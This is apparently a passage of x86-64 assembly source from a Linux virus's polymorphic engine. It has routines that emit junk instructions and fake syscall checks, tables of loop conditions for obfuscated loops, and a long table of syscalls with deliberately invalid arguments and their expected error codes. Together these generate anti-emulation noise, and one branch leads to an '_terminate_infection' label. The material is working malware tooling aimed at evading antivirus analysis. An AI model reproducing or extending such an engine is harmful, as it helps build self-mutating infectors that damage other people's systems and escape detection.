		mov	dword [g_poly_flags],bit(RETAL_POLY_USE_STACK_JUNK)|bit(RETAL_POLY_STACK_VARS_INIT)
		INT3_CALL junk_127
		; restore state
		pop	rax
		mov	[g_current_stack_count],al
		shr	rax,8
		mov	[g_poly_mem_reg_dx],eax
		pop	qword [g_poly_flags]
		; set JE displacement
		pop	rbx
		push	rdi
		pop	rax
		INT3_CALL set_rel8
		END_EBLOCK_OPCODE
		ret

;-[junk_syscall_check_backwards]----------------------------------------------
ADD_FUNCTION
junk_syscall_check_backwards:
		BEGIN_EBLOCK_OPCODE
		INT3_CALL junk_syscall_cmp
		mov	al,0x0F
		stosb
		mov	al,0x80+_cNZ
		stosb
		push	rdi
		pop	rbx
		mov	rax,[g_poly_syscall_rdi]
		INT3_CALL set_rel32
		scasd
		END_EBLOCK_OPCODE
		ret

;-[junk_syscall_check_reg_branch]---------------------------------------------
ADD_FUNCTION
junk_syscall_check_reg_branch:
		POLY_DEBUG_STRING +junk_syscall_check_reg_branch
		BEGIN_EBLOCK_OPCODE
		mov	dh,8
		INT3_CALL alloc_word_reg_DX
		mov	al,128
		INT3_CALL rand_al
		add	eax,180
		add	rax,rdi
		push	rax	; push new rdi
		INT3_CALL rax_to_vaddr
		mov	rbx,[g_poly_syscall]
		movsx	rbx,byte [rbx+JUNK_SYSCALL._err]
		mov	ch,_SUB
		add	rbx,rax	; rbx = target RIP + err no.
		INT3_CALL rand_prob
		jpo	.no_add
		sub	rbx,rax
		sub	rbx,rax
		neg	rbx
		xor	ch,ch
	.no_add:INT3_CALL load_reg_nc
		INT3_CALL junk3
		xor	cl,cl	; rax
		INT3_CALL emit_op_rr
		INT3_CALL junk3
		xor	dh,8^4
		mov	ch,_JMPN
		INT3_CALL emit_op_FE
		pop	rbx
		mov	eax,[g_poly_flags]
		push	rax
		bts	dword [g_poly_flags],RETAL_POLY_IN_JUNK
		lea	rax,[rbx-20]
		mov	[g_max_junk_rdi],rax
		INT3_CALL small_junk
		or	qword [g_max_junk_rdi],-1
		cmp	rbx,rdi
		jb	_terminate_infection
		je	.filldone
	.l:		call	rand_any
			stosb
			cmp	rdi,rbx
			jne	.l
	.filldone:
		pop	rax
		mov	[g_poly_flags],eax
		INT3_CALL free_word_reg_DX
		END_EBLOCK_OPCODE
		POLY_DEBUG_STRING -junk_syscall_check_reg_branch
		ret

;-[loop_type_table]-----------------------------------------------------------
; table of loop type information
; db JconOP
; dq X - Count (INC), Y + Count (DEC)
; X = Lower boundary of range where condition untrue.
; Y = Upper boundary of range where condition untrue.

LOOP_TYPE_SIZE	equ	(1+8+8)

; loop using JNZ/JS/JNS/JNC/JG/JL/JGE/JNO/JC
loop_type_table:
		db      _cNZ		; loop while NZ
		dq      0		; ZF set when 0 reached on INC
		dq	0		; ZF set when 0 reached on DEC

		db      _cS		; loop while S
		dq      0		; SF cleared when zero reached on INC
		dq	(1 << 63) - 1	; SF cleared when high-bit cleared on DEC

loop_type_last_test:
		db      _cNS		; loop while NS
		dq      (1 << 63)	; SF set when high-bit set on INC
		dq	-1		; SF set when -1 reached on DEC

		db	_cNC		; loop while NC, must not use INC/DEC
		dq	0		; CF set when 0 reached on ADD
		dq	-1		; CF set when -1 reached on SUB

		db	_cG		; or _cL on INC
		dq	0		; ZF when 0 reached
		dq	0		; ZF when 0 reached

		db	_cGE		; or _cNO on INC
		dq	(1 << 63)	; OF when neg reached on INC
		dq	-1		; -1 when not GE

		db	_cC		; loop while CF
		dq	0		; CF clear when -1 reached on SUB -1
		dq	-1		; CF clear when 0 reached on ADD -1

LOOP_TYPE_COUNT	EQU	($ - loop_type_table)/LOOP_TYPE_SIZE

; possible conditions to use to compare check value already set
poly_check_conditions:	db _cNZ		; JNZ?
			db 1
			db _cS		; JS?
	check_use_S:	db 0
			db _cPO		; JPO?
	check_use_PO:	db 0
			db _cL		; JL?
	check_use_L:	db 0
POLY_CHECK_COND_COUNT	equ	($ - poly_check_conditions)/2

;-[junk_syscall_table]---------------------------------------------------------
junk_syscall_table:
;--- INVALID
; invalid syscall number
db 127	; bad syscall no.
db JUNK_SYSCALL_NONE, JUNK_SYSCALL_NONE, JUNK_SYSCALL_NONE, JUNK_SYSCALL_NONE
db -38
dd 0
dw 0	; Rand PAD
dd 0	; RDA CRC32

;--- READ
; read - bad fd
db 0
db JUNK_SYSCALL_BAD_FD, JUNK_SYSCALL_GOOD_MEM, JUNK_SYSCALL_RW_SIZE, JUNK_SYSCALL_NONE
db -9; EBADF
dd 0
dw 0	; Rand PAD
dd 0	; RDA CRC32

;--- WRITE
; write - bad fd
db 1
db JUNK_SYSCALL_BAD_FD, JUNK_SYSCALL_GOOD_MEM, JUNK_SYSCALL_RW_SIZE, JUNK_SYSCALL_NONE
db -9; EBADF
dd 0
dw 0	; Rand PAD
dd 0	; RDA CRC32

;--- OPEN
; open - bad mem
db 2
db JUNK_SYSCALL_BAD_MEM, JUNK_SYSCALL_ANY, JUNK_SYSCALL_ANY, JUNK_SYSCALL_NONE
db 0
dd 0
dw 0	; Rand PAD
dd 0	; RDA CRC32

;--- CLOSE
; close - bad fd
db 3
db JUNK_SYSCALL_BAD_FD, JUNK_SYSCALL_NONE, JUNK_SYSCALL_NONE, JUNK_SYSCALL_NONE
db -9 ;EBADF
dd 0
dw 0	; Rand PAD
dd 0	; RDA CRC32

;--- STAT
; stat bad mem filename
db 4
db JUNK_SYSCALL_BAD_MEM, JUNK_SYSCALL_GOOD_MEM, JUNK_SYSCALL_NONE, JUNK_SYSCALL_NONE
db -14 ;EFAULT
dd 0
dw 0	; Rand PAD
dd 0	; RDA CRC32

; stat bad filename
db 4
db JUNK_SYSCALL_GOOD_MEM, JUNK_SYSCALL_BAD_MEM, JUNK_SYSCALL_NONE, JUNK_SYSCALL_NONE
db -2 ;ENOENT
dd 0
dw 0	; Rand PAD
dd 0	; RDA CRC32

;--- FSTAT
;fstat bad fd
db 5
db JUNK_SYSCALL_BAD_FD, JUNK_SYSCALL_GOOD_MEM, JUNK_SYSCALL_NONE, JUNK_SYSCALL_NONE
db -9 ;EBADF
dd 0
dw 0	; Rand PAD
dd 0	; RDA CRC32

;--- LSTAT
; lstat bad mem filename
db 6
db JUNK_SYSCALL_BAD_MEM, JUNK_SYSCALL_GOOD_MEM, JUNK_SYSCALL_NONE, JUNK_SYSCALL_NONE
db -14 ;EFAULT
dd 0
dw 0	; Rand PAD
dd 0	; RDA CRC32

; lstat filename
db 6
db JUNK_SYSCALL_GOOD_MEM, JUNK_SYSCALL_BAD_MEM, JUNK_SYSCALL_NONE, JUNK_SYSCALL_NONE
db -2 ;ENOENT
dd 0
dw 0	; Rand PAD
dd 0	; RDA CRC32

;--- POLL
; poll bad mem
db 7
db JUNK_SYSCALL_BAD_MEM, JUNK_SYSCALL_SIGNED, JUNK_SYSCALL_ANY, JUNK_SYSCALL_NONE
db -22 ;EINVAL
dd 0
dw 0	; Rand PAD
dd 0	; RDA CRC32

; poll bad nfds
db 7
db JUNK_SYSCALL_BAD_MEM, JUNK_SYSCALL_BAD_FD, JUNK_SYSCALL_NONE, JUNK_SYSCALL_NONE
db -14 ;EFAULT
dd 0
dw 0	; Rand PAD
dd 0	; RDA CRC32

;--- LSEEK
; lseek - bad fd
db 8
db JUNK_SYSCALL_BAD_FD, JUNK_SYSCALL_RW_SIZE, JUNK_SYSCALL_WHENCE, JUNK_SYSCALL_NONE
db -9; EBADF
dd 0
dw 0	; Rand PAD
dd 0	; RDA CRC32

;--- MPROTECT
; mprotect - unaligned ptr
db 10
db JUNK_SYSCALL_UNALIGNED, JUNK_SYSCALL_RW_SIZE, JUNK_SYSCALL_CONST, JUNK_SYSCALL_NONE
db -22 ;EINVAL
dd PROT_READ
dw 0	; Rand PAD
dd 0	; RDA CRC32

; mprotect - unmapped ptr
db 10
db JUNK_SYSCALL_BAD_MEM_ALIGNED, JUNK_SYSCALL_RW_SIZE, JUNK_SYSCALL_CONST, JUNK_SYSCALL_NONE
db -12 ;ENOMEM
dd PROT_READ
dw 0	; Rand PAD
dd 0	; RDA CRC32

;--- MUNMAP
; munmap - unmapped ptr
db 11
db JUNK_SYSCALL_BAD_MEM_ALIGNED, JUNK_SYSCALL_RW_SIZE, JUNK_SYSCALL_NONE, JUNK_SYSCALL_NONE
db -22 ;EINVAL
dd 0
dw 0	; Rand PAD
dd 0	; RDA CRC32

;munmap unaligned ptr
db 11
db JUNK_SYSCALL_UNALIGNED, JUNK_SYSCALL_RW_SIZE, JUNK_SYSCALL_NONE, JUNK_SYSCALL_NONE
db -22 ;EINVAL
dd 0
dw 0	; Rand PAD
dd 0	; RDA CRC32

;---BRK
db 12
db JUNK_SYSCALL_BAD_MEM, JUNK_SYSCALL_NONE, JUNK_SYSCALL_NONE, JUNK_SYSCALL_NONE
db 0
dd 0
dw 0	; Rand PAD
dd 0	; RDA CRC32

;---IOCTL
; ioctl - bad descriptor
db 16
db JUNK_SYSCALL_BAD_FD, JUNK_SYSCALL_NONE, JUNK_SYSCALL_GOOD_MEM, JUNK_SYSCALL_NONE
db -9 ;EBADF
dd 0
dw 0	; Rand PAD
dd 0	; RDA CRC32

;--- PREAD64/PWRITE64
; pread - bad file descriptor
db 17
db JUNK_SYSCALL_BAD_FD, JUNK_SYSCALL_GOOD_MEM, JUNK_SYSCALL_RW_SIZE, JUNK_SYSCALL_RW_SIZE
db -9 ;EBADF
dd 0
dw 0	; Rand PAD
dd 0	; RDA CRC32

; pwrite - bad file descriptor
db 18
db JUNK_SYSCALL_BAD_FD, JUNK_SYSCALL_GOOD_MEM, JUNK_SYSCALL_RW_SIZE, JUNK_SYSCALL_RW_SIZE
db -9 ;EBADF
dd 0
dw 0	; Rand PAD
dd 0	; RDA CRC32

; pread - bad file offset
db 17
db JUNK_SYSCALL_RW_SIZE, JUNK_SYSCALL_GOOD_MEM, JUNK_SYSCALL_RW_SIZE, JUNK_SYSCALL_SIGNED
db -22 ;EINVAL
dd 0
dw 0	; Rand PAD
dd 0	; RDA CRC32

; pwrite - bad file offset
db 18
db JUNK_SYSCALL_RW_SIZE, JUNK_SYSCALL_GOOD_MEM, JUNK_SYSCALL_RW_SIZE, JUNK_SYSCALL_SIGNED
db -22 ;EINVAL
dd 0
dw 0	; Rand PAD
dd 0	; RDA CRC32

;--- READV/WRITEV
; readv - badfd
db 19
db JUNK_SYSCALL_BAD_FD, JUNK_SYSCALL_GOOD_MEM, JUNK_SYSCALL_BAD_FD, JUNK_SYSCALL_NONE
db -9 ;EBADF
dd 0
dw 0	; Rand PAD
dd 0	; RDA CRC32

; writev - badfd
db 20
db JUNK_SYSCALL_BAD_FD, JUNK_SYSCALL_GOOD_MEM, JUNK_SYSCALL_BAD_FD, JUNK_SYSCALL_NONE
db -9 ;EBADF
dd 0
dw 0	; Rand PAD
dd 0	; RDA CRC32

;--- ACCESS
; access - bad mem
db 21
db JUNK_SYSCALL_BAD_MEM, JUNK_SYSCALL_7, JUNK_SYSCALL_NONE, JUNK_SYSCALL_NONE
db -14 ;EFAULT
dd 0
dw 0	; Rand PAD
dd 0	; RDA CRC32

; access - bad mode
db 21
db JUNK_SYSCALL_BAD_MEM, JUNK_SYSCALL_SIGNED, JUNK_SYSCALL_NONE, JUNK_SYSCALL_NONE
db -22 ;EINVAL
dd 0
dw 0	; Rand PAD
dd 0	; RDA CRC32

;--- PIPE
; pipe - bad mem
db 22
db JUNK_SYSCALL_BAD_MEM, JUNK_SYSCALL_NONE, JUNK_SYSCALL_NONE, JUNK_SYSCALL_NONE
db -14 ;EFAULT
dd 0
dw 0	; Rand PAD
dd 0	; RDA CRC32

;--- MREMAP
; mremap - bad mem (unaligned)
db 25
db JUNK_SYSCALL_UNALIGNED, JUNK_SYSCALL_RW_SIZE, JUNK_SYSCALL_RW_SIZE, JUNK_SYSCALL_CONST
db -22 ;EINVAL
dd 0
dw 0	; Rand PAD
dd 0	; RDA CRC32

; mremap - bad flags
db 25
db JUNK_SYSCALL_BAD_MEM_ALIGNED, JUNK_SYSCALL_RW_SIZE, JUNK_SYSCALL_RW_SIZE, JUNK_SYSCALL_SIGNED
db -22 ;EINVAL
dd 0
dw 0	; Rand PAD
dd 0	; RDA CRC32

;--- MSYNC
; msync - bad mem (aligned)
db 26
db JUNK_SYSCALL_BAD_MEM_ALIGNED, JUNK_SYSCALL_RW_SIZE, JUNK_SYSCALL_CONST, JUNK_SYSCALL_NONE
db -12 ;ENOMEM
dd 2
dw 0	; Rand PAD
dd 0	; RDA CRC32

; msync - bad mem (unaligned)
db 26
db JUNK_SYSCALL_UNALIGNED, JUNK_SYSCALL_RW_SIZE, JUNK_SYSCALL_CONST, JUNK_SYSCALL_NONE
db -22 ;EINVAL
dd 1
dw 0	; Rand PAD
dd 0	; RDA CRC32

;--- MINCORE
; mincore - bad *vec
db 27
db JUNK_SYSCALL_BAD_MEM_ALIGNED, JUNK_SYSCALL_RW_SIZE, JUNK_SYSCALL_BAD_MEM, JUNK_SYSCALL_NONE
db -12 ;ENOMEM
dd 0
dw 0	; Rand PAD
dd 0	; RDA CRC32

; mincore - unaligned addr
db 27
db JUNK_SYSCALL_UNALIGNED, JUNK_SYSCALL_RW_SIZE, JUNK_SYSCALL_GOOD_MEM, JUNK_SYSCALL_NONE
db -22 ;EINVAL
dd 0
dw 0	; Rand PAD
dd 0	; RDA CRC32

; mincore - bad length
db 27
db JUNK_SYSCALL_BAD_MEM_ALIGNED, JUNK_SYSCALL_SIGNED, JUNK_SYSCALL_GOOD_MEM, JUNK_SYSCALL_NONE
db -12 ;ENOMEM
dd 0
dw 0	; Rand PAD
dd 0	; RDA CRC32

;--- MADVISE
; madvise - unaligned addr
db 28
db JUNK_SYSCALL_UNALIGNED, JUNK_SYSCALL_RW_SIZE, JUNK_SYSCALL_WHENCE, JUNK_SYSCALL_NONE
db -22 ;EINVAL
dd 0
dw 0	; Rand PAD
dd 0	; RDA CRC32

; madvise - bad addr
db 28
db JUNK_SYSCALL_BAD_MEM_ALIGNED, JUNK_SYSCALL_RW_SIZE, JUNK_SYSCALL_WHENCE, JUNK_SYSCALL_NONE
db -12 ;ENOMEM
dd 0
dw 0	; Rand PAD
dd 0	; RDA CRC32

;--- DUP
; dup - bad fd
db 32
db JUNK_SYSCALL_BAD_FD, JUNK_SYSCALL_NONE, JUNK_SYSCALL_NONE, JUNK_SYSCALL_NONE
db -9 ;EBADF
dd 0
dw 0	; Rand PAD
dd 0	; RDA CRC32

;--- DUP2
; dup2 - bad fd in/out
db 33
db JUNK_SYSCALL_BAD_FD, JUNK_SYSCALL_BAD_FD, JUNK_SYSCALL_NONE, JUNK_SYSCALL_NONE
db -9 ;EBADF
dd 0
dw 0	; Rand PAD
dd 0	; RDA CRC32

;--- NANOSLEEP
; nanosleep - bad mem
db 35
db JUNK_SYSCALL_BAD_MEM, JUNK_SYSCALL_NONE, JUNK_SYSCALL_NONE, JUNK_SYSCALL_NONE
db -14 ;EFAULT
dd 0
dw 0	; Rand PAD
dd 0	; RDA CRC32

;--- GETITIMER
; getitimer - bad mem
db 36
db JUNK_SYSCALL_WHENCE, JUNK_SYSCALL_BAD_MEM, JUNK_SYSCALL_NONE, JUNK_SYSCALL_NONE
db -14 ;EFAULT
dd 0
dw 0	; Rand PAD
dd 0	; RDA CRC32

; getitimer - bad 'which'
db 36
db JUNK_SYSCALL_BAD_FD, JUNK_SYSCALL_GOOD_MEM, JUNK_SYSCALL_NONE, JUNK_SYSCALL_NONE
db -22 ;EINVAL
dd 0
dw 0	; Rand PAD
dd 0	; RDA CRC32

;--- ALARM
; alarm - zero delay
db 37
db JUNK_SYSCALL_CONST, JUNK_SYSCALL_NONE, JUNK_SYSCALL_NONE, JUNK_SYSCALL_NONE
db 0
dd 0
dw 0	; Rand PAD
dd 0	; RDA CRC32

;--- SETITIMER
; setitimer - bad mem (new_value)
db 38
db JUNK_SYSCALL_WHENCE, JUNK_SYSCALL_BAD_MEM, JUNK_SYSCALL_GOOD_MEM, JUNK_SYSCALL_NONE
db -14 ;EFAULT
dd 0
dw 0	; Rand PAD
dd 0	; RDA CRC32

; setitimer - bad 'which'
db 38
db JUNK_SYSCALL_BAD_FD, JUNK_SYSCALL_GOOD_MEM, JUNK_SYSCALL_GOOD_MEM, JUNK_SYSCALL_NONE
db -22 ;EINVAL
dd 0
dw 0	; Rand PAD
dd 0	; RDA CRC32

;--- GETPID
db 39
db JUNK_SYSCALL_NONE, JUNK_SYSCALL_NONE, JUNK_SYSCALL_NONE, JUNK_SYSCALL_NONE
db 0
dd 0
dw 0	; Rand PAD
dd 0	; RDA CRC32

;--- SENDFILE64
; sendfile64 - bad in_fd (invalid fd)
db 40
db JUNK_SYSCALL_BAD_FD, JUNK_SYSCALL_BAD_FD, JUNK_SYSCALL_GOOD_MEM, JUNK_SYSCALL_RW_SIZE
db -9 ;EBADF
dd 0
dw 0	; Rand PAD
dd 0	; RDA CRC32

; sendfile64 - bad mem (*offset)
db 40
db JUNK_SYSCALL_BAD_FD, JUNK_SYSCALL_BAD_FD, JUNK_SYSCALL_BAD_MEM, JUNK_SYSCALL_RW_SIZE
db -14 ;EFAULT
dd 0
dw 0	; Rand PAD
dd 0	; RDA CRC32

;--- FLOCK
; flock - bad fd
db 73
db JUNK_SYSCALL_BAD_FD, JUNK_SYSCALL_WHENCE, JUNK_SYSCALL_NONE, JUNK_SYSCALL_NONE
db -9 ;EBADF
dd 0
dw 0	; Rand PAD
dd 0 	; RDA CRC32

;--- FSYNC
; fsync - bad fd
db 74
db JUNK_SYSCALL_BAD_FD, JUNK_SYSCALL_NONE, JUNK_SYSCALL_NONE, JUNK_SYSCALL_NONE
db -9 ;EBADF
dd 0
dw 0	; Rand PAD
dd 0 	; RDA CRC32

;--- FDATASYNC
; fdatasync - bad fd
db 75
db JUNK_SYSCALL_BAD_FD, JUNK_SYSCALL_NONE, JUNK_SYSCALL_NONE, JUNK_SYSCALL_NONE
db -9 ;EBADF
dd 0
dw 0	; Rand PAD
dd 0 	; RDA CRC32

;--- TRUNCATE
; truncate - bad filename ptr
db 76
db JUNK_SYSCALL_BAD_MEM, JUNK_SYSCALL_RW_SIZE, JUNK_SYSCALL_NONE, JUNK_SYSCALL_NONE
db -14 ;EFAULT
dd 0
dw 0	; Rand PAD
dd 0	; RDA CRC32

; truncate - invalid length
db 76
db JUNK_SYSCALL_GOOD_MEM, JUNK_SYSCALL_SIGNED, JUNK_SYSCALL_NONE, JUNK_SYSCALL_NONE
db -22 ;EINVAL
dd 0
dw 0	; Rand PAD
dd 0	; RDA CRC32

;--- FTRUNCATE
; ftruncate - bad fd
db 77
db JUNK_SYSCALL_BAD_FD, JUNK_SYSCALL_RW_SIZE, JUNK_SYSCALL_NONE, JUNK_SYSCALL_NONE
db -9 ;EBADF
dd 0
dw 0	; Rand PAD
dd 0	; RDA CRC32

;--- GETDENTS
; getdents - bad fd
db 78
db JUNK_SYSCALL_BAD_FD, JUNK_SYSCALL_GOOD_MEM, JUNK_SYSCALL_CONST, JUNK_SYSCALL_NONE
db -9 ;EBADF
dd 4096
dw 0	; Rand PAD
dd 0	; RDA CRC32

;--- GETCWD
; getcwd - bad *buf
db 79
db JUNK_SYSCALL_BAD_MEM, JUNK_SYSCALL_CONST, JUNK_SYSCALL_NONE, JUNK_SYSCALL_NONE
db -14 ;EFAULT
dd 1024
dw 0	; Rand PAD
dd 0	; RDA CRC32

;- getcwd - zero size
db 79
db JUNK_SYSCALL_GOOD_MEM, JUNK_SYSCALL_CONST, JUNK_SYSCALL_NONE, JUNK_SYSCALL_NONE
db -34 ;ERANGE
dd 0
dw 0	; Rand PAD
dd 0	; RDA CRC32

; - getcwd - size too small
db 79
db JUNK_SYSCALL_GOOD_MEM, JUNK_SYSCALL_CONST, JUNK_SYSCALL_NONE, JUNK_SYSCALL_NONE
db -34 ;ERANGE
dd 1
dw 0	; Rand PAD
dd 0	; RDA CRC32

;--- CHDIR
; - chdir - bad path ptr
db 80
db JUNK_SYSCALL_BAD_MEM, JUNK_SYSCALL_NONE, JUNK_SYSCALL_NONE, JUNK_SYSCALL_NONE
db -14 ;EFAULT
dd 0
dw 0	; Rand PAD
dd 0	; RDA CRC32

; - chdir - path does not exist
db 80
db JUNK_SYSCALL_GOOD_MEM, JUNK_SYSCALL_NONE, JUNK_SYSCALL_NONE, JUNK_SYSCALL_NONE
db -2 ;ENOENT
dd 0
dw 0	; Rand PAD
dd 0	; RDA CRC32

;--- FCHDIR
; - fchdir - bad fd
db 81
db JUNK_SYSCALL_BAD_FD, JUNK_SYSCALL_NONE, JUNK_SYSCALL_NONE, JUNK_SYSCALL_NONE
db -9 ;EBADF
dd 0
dw 0	; Rand PAD
dd 0	; RDA CRC32

;--- RENAME
; - rename - bad *old/*new ptr
db 82
db JUNK_SYSCALL_BAD_MEM, JUNK_SYSCALL_BAD_MEM, JUNK_SYSCALL_NONE, JUNK_SYSCALL_NONE
db -14 ;EFAULT
dd 0
dw 0	; Rand PAD
dd 0	; RDA CRC32

; - rename - bad *old ptr
db 82
db JUNK_SYSCALL_BAD_MEM, JUNK_SYSCALL_GOOD_MEM, JUNK_SYSCALL_NONE, JUNK_SYSCALL_NONE
db -14 ;EFAULT
dd 0
dw 0	; Rand PAD
dd 0	; RDA CRC32

; - rename - bad old/new path name
db 82
db JUNK_SYSCALL_GOOD_MEM, JUNK_SYSCALL_GOOD_MEM, JUNK_SYSCALL_NONE, JUNK_SYSCALL_NONE
db -2 ;ENOENT
dd 0
dw 0	; Rand PAD
dd 0	; RDA CRC32


;--- MKDIR
; - mkdir bad ptr
db 83
db JUNK_SYSCALL_BAD_MEM, JUNK_SYSCALL_CONST, JUNK_SYSCALL_NONE, JUNK_SYSCALL_NONE
db -14 ;EFAULT
dd 0777
dw 0	; Rand PAD
dd 0	; RDA CRC32

;--- RMDIR
; - rmdir bad ptr
db 84
db JUNK_SYSCALL_BAD_MEM, JUNK_SYSCALL_NONE, JUNK_SYSCALL_NONE, JUNK_SYSCALL_NONE
db -14 ;EFAULT
dd 0
dw 0	; Rand PAD
dd 0	; RDA CRC32

; - rmdir bad ptr
db 84
db JUNK_SYSCALL_BAD_MEM, JUNK_SYSCALL_NONE, JUNK_SYSCALL_NONE, JUNK_SYSCALL_NONE
db -14 ;EFAULT
dd 0
dw 0	; Rand PAD
dd 0	; RDA CRC32

;--- CREAT
; - creat bad ptr
db 85
db JUNK_SYSCALL_BAD_MEM, JUNK_SYSCALL_NONE, JUNK_SYSCALL_NONE, JUNK_SYSCALL_NONE
db -14 ;EFAULT
dd 0
dw 0	; Rand PAD
dd 0	; RDA CRC32

;--- LINK
; - link bad old ptr
db 86
db JUNK_SYSCALL_BAD_MEM, JUNK_SYSCALL_GOOD_MEM, JUNK_SYSCALL_NONE, JUNK_SYSCALL_NONE
db -14 ;EFAULT
dd 0
dw 0	; Rand PAD
dd 0	; RDA CRC32

;--- UNLINK
; - unlink bad ptr
db 87
db JUNK_SYSCALL_BAD_MEM, JUNK_SYSCALL_NONE, JUNK_SYSCALL_NONE, JUNK_SYSCALL_NONE
db -14 ;EFAULT
dd 0
dw 0	; Rand PAD
dd 0	; RDA CRC32

;--- SYMLINK
; - symlink bad old ptr
db 88
db JUNK_SYSCALL_BAD_MEM, JUNK_SYSCALL_GOOD_MEM, JUNK_SYSCALL_NONE, JUNK_SYSCALL_NONE
db -14 ;EFAULT
dd 0
dw 0	; Rand PAD
dd 0	; RDA CRC32

;--- READLINKs
; - readlink bad name ptr
db 89
db JUNK_SYSCALL_BAD_MEM, JUNK_SYSCALL_GOOD_MEM, JUNK_SYSCALL_RW_SIZE, JUNK_SYSCALL_NONE
db -14 ; EFAULT
dd 0
dw 0	; Rand PAD
dd 0	; RDA CRC32

; - readlink bad filename
db 89
db -2 ;ENOENT
db JUNK_SYSCALL_GOOD_MEM, JUNK_SYSCALL_GOOD_MEM, JUNK_SYSCALL_RW_SIZE, JUNK_SYSCALL_NONE
dd 0
dw 0	; Rand PAD
dd 0	; RDA CRC32

;--- CHMOD, FCHMOD
; - chmod bad ptr
db 90
db JUNK_SYSCALL_BAD_MEM, JUNK_SYSCALL_7, JUNK_SYSCALL_NONE, JUNK_SYSCALL_NONE
db -14 ;EFAULT
dd 0
dw 0	; Rand PAD
dd 0	; RDA CRC32

; - fchmod bad fd
db 91
db JUNK_SYSCALL_BAD_FD, JUNK_SYSCALL_7, JUNK_SYSCALL_NONE, JUNK_SYSCALL_NONE
db -9  ;EBADF
dd 0
dw 0	; Rand PAD
dd 0	; RDA CRC32

;--- CHOWN, FCHOWN, LCHOWN
; chown bad ptr
db 92
db JUNK_SYSCALL_BAD_MEM, JUNK_SYSCALL_RW_SIZE, JUNK_SYSCALL_RW_SIZE, JUNK_SYSCALL_NONE
db -14 ;EFAULT
dd 0
dw 0	; Rand PAD
dd 0	; RDA CRC32

; fchown bad fd
db 93
db JUNK_SYSCALL_BAD_FD, JUNK_SYSCALL_RW_SIZE, JUNK_SYSCALL_RW_SIZE, JUNK_SYSCALL_NONE
db -9  ;EBADF
dd 0
dw 0	; Rand PAD
dd 0	; RDA CRC32

; lchown bad ptr
db 94
db JUNK_SYSCALL_BAD_MEM, JUNK_SYSCALL_RW_SIZE, JUNK_SYSCALL_RW_SIZE, JUNK_SYSCALL_NONE
db -14 ;EFAULT
dd 0
dw 0	; Rand PAD
dd 0	; RDA CRC32

;--- GETTIMEOFDAY
; gettimeofday bat ptr1
db 96
db JUNK_SYSCALL_BAD_MEM, JUNK_SYSCALL_GOOD_MEM, JUNK_SYSCALL_NONE, JUNK_SYSCALL_NONE
db -14 ;EFAULT
dd 0
dw 0	; Rand PAD
dd 0	; RDA CRC32

; gettimeofday bat ptr2
db 96
db JUNK_SYSCALL_GOOD_MEM, JUNK_SYSCALL_BAD_MEM, JUNK_SYSCALL_NONE, JUNK_SYSCALL_NONE
db -14 ;EFAULT
dd 0
dw 0	; Rand PAD
dd 0	; RDA CRC32


;--- GETRLIMIT
; getrlimit bad resource
db 97
db JUNK_SYSCALL_SIGNED, JUNK_SYSCALL_GOOD_MEM, JUNK_SYSCALL_NONE, JUNK_SYSCALL_NONE
db -22 ;EINVAL
dd 0
dw 0	; Rand PAD
dd 0	; RDA CRC32

; getrlimit bad ptr
db 97
db JUNK_SYSCALL_7, JUNK_SYSCALL_BAD_MEM, JUNK_SYSCALL_NONE, JUNK_SYSCALL_NONE
db -14 ;EFAULT
dd 0
dw 0	; Rand PAD
dd 0	; RDA CRC32

;--- GETRUSAGE
; getrusage - bad resource
db 98
db JUNK_SYSCALL_SIGNED, JUNK_SYSCALL_GOOD_MEM, JUNK_SYSCALL_NONE, JUNK_SYSCALL_NONE
db -22 ;EINVAL
dd 0
dw 0	; Rand PAD
dd 0	; RDA CRC32

; getrusage bad ptr
db 98
db JUNK_SYSCALL_CONST, JUNK_SYSCALL_BAD_MEM, JUNK_SYSCALL_NONE, JUNK_SYSCALL_NONE
db -14 ;EFAULT
dd 1
dw 0	; Rand PAD
dd 0	; RDA CRC32

;--- SYSINFO
; sysinfo bad ptr
db 99
db JUNK_SYSCALL_BAD_MEM, JUNK_SYSCALL_NONE, JUNK_SYSCALL_NONE, JUNK_SYSCALL_NONE
db -14 ;EFAULT
dd 0
dw 0	; Rand PAD
dd 0	; RDA CRC32

;--- TIMES
; times bad ptr
db 100
db JUNK_SYSCALL_BAD_MEM, JUNK_SYSCALL_NONE, JUNK_SYSCALL_NONE, JUNK_SYSCALL_NONE
db -14 ;EFAULT
dd 0
dw 0	; Rand PAD
dd 0	; RDA CRC32

; times null ptr
db 100
db JUNK_SYSCALL_CONST, JUNK_SYSCALL_NONE, JUNK_SYSCALL_NONE, JUNK_SYSCALL_NONE
db 0
dd 0
dw 0	; Rand PAD
dd 0	; RDA CRC32

;--- GETUID, GETGID
; getuid
db 102
db JUNK_SYSCALL_NONE, JUNK_SYSCALL_NONE, JUNK_SYSCALL_NONE, JUNK_SYSCALL_NONE
db 0
dd 0
dw 0	; Rand PAD
dd 0	; RDA CRC32

; getgid
db 104
db JUNK_SYSCALL_NONE, JUNK_SYSCALL_NONE, JUNK_SYSCALL_NONE, JUNK_SYSCALL_NONE
db 0
dd 0
dw 0	; Rand PAD
dd 0	; RDA CRC32

;--- GETEUID, GETEGID
; geteuid
db 107
db JUNK_SYSCALL_NONE, JUNK_SYSCALL_NONE, JUNK_SYSCALL_NONE, JUNK_SYSCALL_NONE
db 0
dd 0
dw 0	; Rand PAD
dd 0	; RDA CRC32

; getgid
db 108
db JUNK_SYSCALL_NONE, JUNK_SYSCALL_NONE, JUNK_SYSCALL_NONE, JUNK_SYSCALL_NONE
db 0
dd 0
dw 0	; Rand PAD
dd 0	; RDA CRC32

;--- GETPID, GETPGRP
; getpid
db 110
db JUNK_SYSCALL_NONE, JUNK_SYSCALL_NONE, JUNK_SYSCALL_NONE, JUNK_SYSCALL_NONE
db 0
dd 0
dw 0	; Rand PAD
dd 0	; RDA CRC32

; getpgrp
db 111
db JUNK_SYSCALL_NONE, JUNK_SYSCALL_NONE, JUNK_SYSCALL_NONE, JUNK_SYSCALL_NONE
db 0
dd 0
dw 0	; Rand PAD
dd 0	; RDA CRC32
JUNK_SYSCALLS_COUNT 	equ		($ - junk_syscall_table)/JUNK_SYSCALL_size
